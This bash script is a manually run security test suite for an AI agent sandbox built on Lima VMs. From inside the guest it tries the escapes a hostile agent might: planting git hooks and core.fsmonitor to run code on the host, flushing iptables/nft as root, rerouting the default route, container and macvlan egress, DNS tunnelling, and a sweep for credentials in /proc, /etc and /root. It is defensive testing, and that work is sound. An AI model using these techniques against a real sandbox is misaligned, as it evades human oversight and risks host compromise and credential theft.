#!/bin/bash
# run.sh
#
# The live security suite (issues/prd-pj-sandbox.md, "Testing Decisions";
# user story 24; issue 027). Spawns a disposable live-* task (Lima VM
# pjsb-live-*) from a scratch repo, attacks it from inside the guest the ways
# a hostile agent would, runs `pj-sandbox verify` on it, and then `rm`s it,
# even after a failure or Ctrl-C. It needs a real Mac host with Lima and
# socket_vmnet, so it's run by hand (`make sandbox-live-test`; MT-6 in
# issues/manual-tests.md) and never by `make test`.
#
# Usage: run.sh [--dry-run]
#
# Attacks, each printed as PASS (blocked) or FAIL (got through):
#   [hook-escape]       the guest plants .git/hooks/post-checkout (and other
#                       hooks), core.fsmonitor, and core.hooksPath pointing at
#                       hooks it commits to the tree, all touching a host
#                       marker file. Then `pj-sandbox fetch` and a host
#                       `git status` and `git checkout` of the fetched ref
#                       run. The marker must never appear, and the host
#                       repo's config must not pick up either setting.
#   [egress-root]       as root: `iptables -F`, `nft flush ruleset`, then the
#                       default route pointed at each gateway the guest can
#                       see, and a direct `curl` to a denied host through
#                       each. The lockdown is put back afterwards.
#   [container-egress]  a default-bridge container and a container on a
#                       macvlan network off each guest NIC each `curl` the
#                       denied host.
#   [dns-tunnel]    `dig` to an outside resolver and to Lima's own
#                       resolver, on UDP and TCP 53.
#   [token-hunt]        verify's scanner (lib/verify_scan.py) run over far
#                       more of the guest than `verify` covers: every
#                       process's environ and cmdline, /etc, /root, /home,
#                       /tmp, /var/tmp, /var/log, /run, /opt and /workspace.
#                       Only salted sha256 fingerprints reach the guest.
#   [placeholder-leak]  the gh placeholder sent to an allowlisted host that
#                       isn't GitHub. The proxy must log a `placeholder-leak`
#                       denial for it.
# Then `pj-sandbox verify` runs and is reported as [verify].
#
# The attacks run in the order above, except egress-root, which runs last
# because it disturbs the guest's network. A summary follows, and the exit
# status is 0 only if every line is a PASS. An attack whose setup fails (an
# image that won't pull, a tool that isn't there, a macvlan network or route
# change it couldn't make) is a FAIL, not a PASS: that way out wasn't shown
# to be blocked.
#
# Before attacking, the host checks it can reach the denied host itself. If
# it can't, a PASS against it proves nothing, and a warning says so.
#
# Options:
#   --dry-run   print every command and guest script, without calling
#               pj-sandbox, limactl or the network
#   -h, --help  show this help
#
# Environment (defaults in parentheses):
#   PJ_SANDBOX_LIVE_CLI          the pj-sandbox to drive (pj-sandbox/bin/pj-sandbox)
#   PJ_SANDBOX_LIVE_BASE         --base template for the task (none)
#   PJ_SANDBOX_LIVE_DENIED_HOST  a host no allowlist names (example.com)
#   PJ_SANDBOX_LIVE_RESOLVER     an outside DNS resolver (8.8.8.8)
#   PJ_SANDBOX_LIVE_LEAK_HOST    an allowlisted host that isn't GitHub
#                                (api.anthropic.com)
#   PJ_SANDBOX_LIVE_IMAGE        the container image the container attacks
#                                run (curlimages/curl:8.10.1); its registry's
#                                hosts are allowlisted for the scratch repo

set -euo pipefail

SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do SOURCE="$(readlink "$SOURCE")"; done
LIVE_DIR="$(cd -P "$(dirname "$SOURCE")" && pwd)"
PJ_SANDBOX_HOME="$(cd -P "$LIVE_DIR/../.." && pwd)"
PJ_SANDBOX_DOTFILES_HOME="$(cd -P "$PJ_SANDBOX_HOME/.." && pwd)"
export PJ_SANDBOX_HOME PJ_SANDBOX_DOTFILES_HOME

usage() {
	sed -n '2,/^$/p' "$SOURCE" | sed 's/^# \{0,1\}//'
}

die() {
	echo "run.sh: $*" >&2
	exit 1
}

dry_run=0
while [ "$#" -gt 0 ]; do
	case "$1" in
		-h | --help)
			usage
			exit 0
			;;
		--dry-run) dry_run=1 ;;
		*) die "unknown argument '$1' (see --help)" ;;
	esac
	shift
done

CLI="${PJ_SANDBOX_LIVE_CLI:-$PJ_SANDBOX_HOME/bin/pj-sandbox}"
BASE="${PJ_SANDBOX_LIVE_BASE:-none}"
DENIED_HOST="${PJ_SANDBOX_LIVE_DENIED_HOST:-example.com}"
RESOLVER="${PJ_SANDBOX_LIVE_RESOLVER:-8.8.8.8}"
LEAK_HOST="${PJ_SANDBOX_LIVE_LEAK_HOST:-api.anthropic.com}"
IMAGE="${PJ_SANDBOX_LIVE_IMAGE:-curlimages/curl:8.10.1}"
GH_PLACEHOLDER=pjsb-placeholder-gh
# Lima's user-mode gateway and resolver on eth0, and the host's address on
# the socket_vmnet host-only network (pj-sandbox/docs/spike-egress.md).
SLIRP_GATEWAY=192.168.5.2
SLIRP_RESOLVER=192.168.5.3
HOSTONLY_GATEWAY=192.168.106.1
# What docker needs to pull IMAGE through the proxy.
REGISTRY_HOSTS="registry-1.docker.io auth.docker.io production.cloudflare.docker.com"

TASK="live-$(date +%Y%m%d%H%M%S)-$$"

# --- guest scripts ---
#
# Each is sent on stdin to `pj-sandbox exec <task> -- bash -s` (or `sudo bash
# -s`). It exits 10 if the attack got through, so that a script that merely
# broke (or an ssh that couldn't connect) isn't read as a breach, and any
# other non-zero status if it couldn't run. On a FAIL its stderr says which
# way out worked.

# hook_plant_script MARKER
#
# Runs as the guest user in /workspace. Commits hooks to the tree first,
# with hooks off, then plants the rest, so its own commit can't trip them.
hook_plant_script() {
	cat <<EOF
set -eu
cd /workspace
marker='$1'
hooks="post-checkout post-merge post-rewrite post-commit reference-transaction pre-commit pre-push"
EOF
	cat <<'EOF'
write_hooks() {
	mkdir -p "$1"
	for h in $hooks; do
		printf '#!/bin/sh\ntouch "%s"\n' "$marker" > "$1/$h"
		chmod +x "$1/$h"
	done
}
# Hooks committed into the tree, for core.hooksPath to point at.
write_hooks .pjsb-hooks
git add .pjsb-hooks
git -c core.hooksPath=/dev/null commit -q -m 'live suite: plant hooks'
# Hooks in the guest's own .git, and both config keys.
write_hooks .git/hooks
git config core.hooksPath .pjsb-hooks
git config core.fsmonitor "touch \"$marker\""
test -x .git/hooks/post-checkout
EOF
}

# outcome_script: the outcome helper both curl-probing scripts share. A probe
# only shows a block if curl itself said it couldn't connect (7) or timed out
# (28). Any other failure, such as docker's own 125-127 for a container that
# never started, or curl failing after it connected, shows nothing, and
# counts as skipped rather than blocked.
outcome_script() {
	cat <<'EOF'
# outcome RC WHAT: records what one probe's exit status shows.
outcome() {
	case "$1" in
		0)
			echo "  $2 reached $denied_host" >&2
			reached=10
			;;
		7 | 28) ;;
		*)
			echo "  $2 didn't get as far as connecting (exit $1), so it showed nothing" >&2
			skipped=1
			;;
	esac
}
EOF
}

# egress_root_script DENIED_ADDR
#
# Runs as root. Plays the attacker, then puts the lockdown back so the rest
# of the run sees the guest as spawn left it.
egress_root_script() {
	cat <<EOF
set -u
denied_host='$DENIED_HOST'
denied_addr='$1'
slirp_gw='$SLIRP_GATEWAY'
hostonly_gw='$HOSTONLY_GATEWAY'
EOF
	outcome_script
	cat <<'EOF'
saved="$(ip -4 route show default)"
iptables -F; iptables -P OUTPUT ACCEPT; iptables -t nat -F
ip6tables -F 2>/dev/null; ip6tables -P OUTPUT ACCEPT 2>/dev/null
nft flush ruleset 2>/dev/null
reached=0
skipped=0
while read -r gw dev; do
	# The first line is empty when the guest has no gatewayed routes left.
	[ -n "$gw" ] || continue
	if ! ip -4 route replace default via "$gw" dev "$dev" 2>/dev/null; then
		echo "  couldn't point the default route via $gw dev $dev, so that way out wasn't tried" >&2
		skipped=1
		continue
	fi
	curl -sS -o /dev/null --noproxy '*' --max-time 10 \
		--resolve "$denied_host:443:$denied_addr" "https://$denied_host/"
	outcome "$?" "curl via $gw dev $dev"
done <<ROUTES
$(ip -4 route show | awk '/ via / { for (i = 1; i < NF; i++) { if ($i == "via") g = $(i + 1); if ($i == "dev") d = $(i + 1) } print g, d }')
$slirp_gw eth0
$hostonly_gw lima0
ROUTES
# Put the lockdown back.
while ip -4 route del default 2>/dev/null; do :; done
printf '%s\n' "$saved" | while read -r route; do
	[ -z "$route" ] || ip -4 route add $route
done
/usr/local/sbin/pjsb-egress-lockdown >/dev/null 2>&1 || echo "  couldn't re-run pjsb-egress-lockdown" >&2
[ "$reached" -ne 0 ] || [ "$skipped" -eq 0 ] || exit 3
exit "$reached"
EOF
}

# container_script DENIED_ADDR
#
# Runs as root. The containers get no proxy settings, so they try to go
# straight out.
container_script() {
	cat <<EOF
set -u
denied_host='$DENIED_HOST'
denied_addr='$1'
image='$IMAGE'
slirp_gw='$SLIRP_GATEWAY'
hostonly_gw='$HOSTONLY_GATEWAY'
EOF
	outcome_script
	cat <<'EOF'
reached=0
skipped=0
probe() {
	docker run --rm "$@" "$image" -sS -o /dev/null --max-time 10 \
		--resolve "$denied_host:443:$denied_addr" "https://$denied_host/"
}
if ! docker pull -q "$image" >/dev/null; then
	echo "  couldn't pull $image, so no container ran" >&2
	exit 2
fi
# A container on the default bridge.
probe
outcome "$?" "a default-bridge container"
# A container on a macvlan network off each guest NIC.
for dev in $(ls /sys/class/net); do
	case "$dev" in lo | docker* | veth* | br-*) continue ;; esac
	subnet="$(ip -4 route show dev "$dev" scope link proto kernel | awk '{ print $1; exit }')"
	[ -n "$subnet" ] || continue
	case "$dev" in
		eth0) gw="$slirp_gw" ;;
		lima0) gw="$hostonly_gw" ;;
		*) gw="" ;;
	esac
	# Pinned to .250: docker would otherwise hand out the first free address,
	# .2, which is the guest's own DHCP lease on lima0. With a duplicate IP the
	# replies go to the guest, and the probe fails whatever the network allows.
	case "$subnet" in
		*.0/24) range="${subnet%.0/24}.250/32" ;;
		*)
			echo "  $dev's subnet $subnet isn't a /24, so there's no safe address to pin a container to" >&2
			skipped=1
			continue
			;;
	esac
	docker network rm pjsb-live-mv >/dev/null 2>&1 || true
	if ! docker network create -d macvlan -o parent="$dev" --subnet "$subnet" --ip-range "$range" ${gw:+--gateway "$gw"} pjsb-live-mv >/dev/null; then
		echo "  couldn't make a macvlan network off $dev, so no container tried it" >&2
		skipped=1
		continue
	fi
	probe --network pjsb-live-mv
	outcome "$?" "a macvlan container off $dev"
	docker network rm pjsb-live-mv >/dev/null 2>&1 || true
done
[ "$reached" -ne 0 ] || [ "$skipped" -eq 0 ] || exit 3
exit "$reached"
EOF
}

# dns_script
#
# Runs as root. Any answer at all means a tunnel would work.
dns_script() {
	cat <<EOF
set -u
denied_host='$DENIED_HOST'
resolvers='$RESOLVER $SLIRP_RESOLVER'
EOF
	cat <<'EOF'
command -v dig >/dev/null 2>&1 || { echo "  dig isn't installed" >&2; exit 2; }
# answered DIG_ARGS...: true if dig got any reply at all, even NXDOMAIN or
# REFUSED (whose +short output is empty), since any reply means a tunnel
# could work. On a timeout dig exits non-zero but still prints ";; ..." to
# stdout, so its output alone can't be trusted.
answered() {
	out="$(dig "$@")" && printf '%s\n' "$out" | grep -qv '^;'
}
reached=0
for r in $resolvers; do
	if answered +time=3 +tries=1 +short "@$r" "$denied_host"; then
		echo "  UDP 53 to $r answered" >&2
		reached=10
	fi
	if answered +tcp +time=3 +tries=1 +short "@$r" "$denied_host"; then
		echo "  TCP 53 to $r answered" >&2
		reached=10
	fi
done
exit "$reached"
EOF
}

# leak_script
#
# Runs as the guest user, so it goes through the proxy the way an agent's
# request would.
leak_script() {
	cat <<EOF
curl -sS -o /dev/null --max-time 20 -H 'Authorization: Bearer $GH_PLACEHOLDER' 'https://$LEAK_HOST/'
EOF
}

# The guest half of token-hunt, in place of verify's narrower path list.
# Like verify's, it runs after a heredoc that puts the scanner in $prog.
TOKEN_HUNT_SCAN_SH='run=""
if sudo -n true 2>/dev/null; then run="sudo -n"; fi
set -- scan "$@" -- "$root"/proc/[0-9]*/environ "$root"/proc/[0-9]*/cmdline \
	"$root/etc" "$root/root" "$root/home" "$root/tmp" "$root/var/tmp" \
	"$root/var/log" "$root/run" "$root/opt" "$root/workspace"
env | $run python3 -c "$prog" "$@"'

# --- dry run ---

if [ "$dry_run" -eq 1 ]; then
	repo="<scratch repo>"
	marker="<scratch dir>/hook-escape-marker"
	cat <<EOF
== Setup ==
git init $repo, with one commit
printf '%s\n' $REGISTRY_HOSTS >> $repo/.git/pj-sandbox/allowlist
(cd $repo && $CLI spawn $TASK --base $BASE)
[control] curl -sS -o /dev/null --max-time 10 https://$DENIED_HOST/   (from the host)

== [hook-escape] ==
$CLI exec $TASK -- bash -s <<'GUEST'
$(hook_plant_script "$marker")
GUEST
$CLI fetch $TASK
cd $repo && git status
cd $repo && git checkout -q --detach refs/sandbox/$TASK/$TASK && git checkout -q -
test ! -e $marker
git -C $repo config --get core.hooksPath   (must be unset)
git -C $repo config --get core.fsmonitor   (must be unset)

== [container-egress] ==
$CLI exec $TASK -- sudo bash -s <<'GUEST'
$(container_script "<addr of $DENIED_HOST>")
GUEST

== [dns-tunnel] ==
$CLI exec $TASK -- sudo bash -s <<'GUEST'
$(dns_script)
GUEST

== [token-hunt] ==
verify's no-tokens check (lib/cmd_verify.sh) with this scan, run with
python3 -c "\$(cat $PJ_SANDBOX_HOME/lib/verify_scan.py)" in the guest:
$TOKEN_HUNT_SCAN_SH

== [placeholder-leak] ==
$CLI exec $TASK -- bash -s <<'GUEST'
$(leak_script)
GUEST
$CLI logs $TASK --denied --json   (must have rule placeholder-leak for $LEAK_HOST)

== [egress-root] ==
$CLI exec $TASK -- sudo bash -s <<'GUEST'
$(egress_root_script "<addr of $DENIED_HOST>")
GUEST

== [verify] ==
$CLI verify $TASK

== Teardown (always, even after a failure) ==
$CLI rm $TASK
EOF
	exit 0
fi

# --- live run ---

work="$(mktemp -d "${TMPDIR:-/tmp}/pjsb-live.XXXXXX")"
work="$(cd -P "$work" && pwd)"
repo="$work/repo"
marker="$work/hook-escape-marker"
spawned=0

teardown() {
	status=$?
	trap - EXIT INT TERM
	if [ "$spawned" -eq 1 ]; then
		echo "== Teardown =="
		"$CLI" rm "$TASK" || echo "run.sh: '$CLI rm $TASK' failed; delete pjsb-$TASK by hand" >&2
	fi
	rm -rf "$work"
	exit "$status"
}
trap teardown EXIT
trap 'exit 130' INT TERM

results=""
failed=0
# report STATUS LABEL REASON
report() {
	line="$(printf '%-4s [%s] %s' "$1" "$2" "$3")"
	echo "$line"
	results="$results$line
"
	[ "$1" = PASS ] || failed=1
}

# guest [sudo] < SCRIPT: runs SCRIPT in the task's guest with bash.
guest() {
	"$CLI" exec "$TASK" -- "$@" bash -s
}

resolve() {
	python3 -c 'import socket, sys; print(socket.gethostbyname(sys.argv[1]))' "$1" 2>/dev/null || true
}

attack_hook_escape() {
	if ! hook_plant_script "$marker" | guest; then
		report FAIL hook-escape "couldn't plant the hooks in the guest, so nothing was tested"
		return
	fi
	if ! "$CLI" fetch "$TASK" >/dev/null; then
		report FAIL hook-escape "pj-sandbox fetch failed, so nothing was tested"
		return
	fi
	ref="refs/sandbox/$TASK/$TASK"
	(
		cd "$repo"
		git status >/dev/null 2>&1 || true
		git checkout -q --detach "$ref" 2>/dev/null &&
			test -x .pjsb-hooks/post-checkout &&
			git checkout -q - 2>/dev/null
	) || {
		report FAIL hook-escape "the host couldn't check out $ref with the planted hooks in it, so nothing was tested"
		return
	}
	leaked=""
	[ ! -e "$marker" ] || leaked="the marker $marker was created on the host"
	for key in core.hooksPath core.fsmonitor; do
		if value="$(git -C "$repo" config --local --get "$key")"; then
			leaked="${leaked:+$leaked; }the host repo has $key=$value"
		fi
	done
	if [ -n "$leaked" ]; then
		report FAIL hook-escape "$leaked"
	else
		report PASS hook-escape "fetch, git status and checkout of $ref ran no guest hook or config"
	fi
}

# guest_attack LABEL WHAT SCRIPT_FN [ARG...]: runs SCRIPT_FN's script as
# root in the guest. Exit 0 is a PASS, 10 got through, anything else couldn't
# run.
guest_attack() {
	label="$1" what="$2" fn="$3"
	shift 3
	if "$fn" "$@" | guest sudo; then
		report PASS "$label" "$what: blocked"
	else
		case "$?" in
			10) report FAIL "$label" "$what: got through (see above)" ;;
			*) report FAIL "$label" "$what: couldn't run (see above), so nothing was tested" ;;
		esac
	fi
}

attack_token_hunt() {
	out="$(
		# shellcheck source=../../lib/cmd_verify.sh
		. "$PJ_SANDBOX_HOME/lib/cmd_verify.sh"
		# Through the same CLI as every other step.
		cmd_exec() { "$CLI" exec "$@"; }
		_PJ_SANDBOX_VERIFY_SCAN_SH="$TOKEN_HUNT_SCAN_SH"
		_pj_sandbox_verify_report() { printf '%s\t%s\n' "$1" "$3"; }
		task="$TASK"
		creds="$(pj_sandbox_state_get "$TASK" creds 2>/dev/null || true)"
		_pj_sandbox_verify_tokens
	)" || true
	fails="$(printf '%s\n' "$out" | awk -F '\t' '$1 == "FAIL" { print $2 }')"
	passes="$(printf '%s\n' "$out" | awk -F '\t' '$1 == "PASS" { print $2 }')"
	if [ -n "$fails" ]; then
		report FAIL token-hunt "$(printf '%s\n' "$fails" | paste -sd ';' -)"
	elif [ -n "$passes" ]; then
		report PASS token-hunt "$passes"
	else
		report FAIL token-hunt "no token to hunt for: $(printf '%s\n' "$out" | cut -f2 | paste -sd ';' -)"
	fi
}

attack_placeholder_leak() {
	leak_script | guest >/dev/null 2>&1 || true
	# Like verify, try for about two seconds, so a proxy that hasn't flushed
	# yet isn't mistaken for one that never logged the leak.
	tries=0
	until leak_logged; do
		if [ "$tries" -ge 10 ]; then
			report FAIL placeholder-leak "no placeholder-leak line for $LEAK_HOST in the task's egress log"
			return
		fi
		sleep 0.2
		tries=$((tries + 1))
	done
	report PASS placeholder-leak "the proxy denied $GH_PLACEHOLDER to $LEAK_HOST and logged a placeholder-leak"
}

# leak_logged: true if the task's denied log has a placeholder-leak for
# LEAK_HOST.
leak_logged() {
	"$CLI" logs "$TASK" --denied --json 2>/dev/null | python3 -c '
import json, sys
for line in sys.stdin:
    try:
        e = json.loads(line)
    except ValueError:
        continue
    if e.get("rule") == "placeholder-leak" and e.get("host") == sys.argv[1]:
        sys.exit(0)
sys.exit(1)
' "$LEAK_HOST"
}

echo "== Setup =="
git init -q "$repo"
git -C "$repo" commit -q --allow-empty -m 'live suite: scratch repo'
mkdir -p "$repo/.git/pj-sandbox"
printf '%s\n' $REGISTRY_HOSTS >> "$repo/.git/pj-sandbox/allowlist"

spawned=1
if ! (cd "$repo" && "$CLI" spawn "$TASK" --base "$BASE"); then
	report FAIL spawn "pj-sandbox spawn $TASK failed, so no attack ran"
	exit 1
fi

denied_addr="$(resolve "$DENIED_HOST")"
[ -n "$denied_addr" ] || die "couldn't resolve $DENIED_HOST on the host"
if ! curl -sS -o /dev/null --max-time 10 "https://$DENIED_HOST/" 2>/dev/null; then
	echo "WARNING: the host can't reach https://$DENIED_HOST/ either, so a PASS against it proves nothing" >&2
fi

echo "== Attacks (task $TASK) =="
attack_hook_escape
guest_attack container-egress "containers to $DENIED_HOST" container_script "$denied_addr"
guest_attack dns-tunnel "DNS for $DENIED_HOST" dns_script
attack_token_hunt
attack_placeholder_leak
guest_attack egress-root "root after iptables -F and a route change, to $DENIED_HOST" egress_root_script "$denied_addr"

echo "== Verify =="
if "$CLI" verify "$TASK"; then
	report PASS verify "pj-sandbox verify passed"
else
	report FAIL verify "pj-sandbox verify failed (see above)"
fi

echo "== Summary =="
printf '%s' "$results"
exit "$failed"
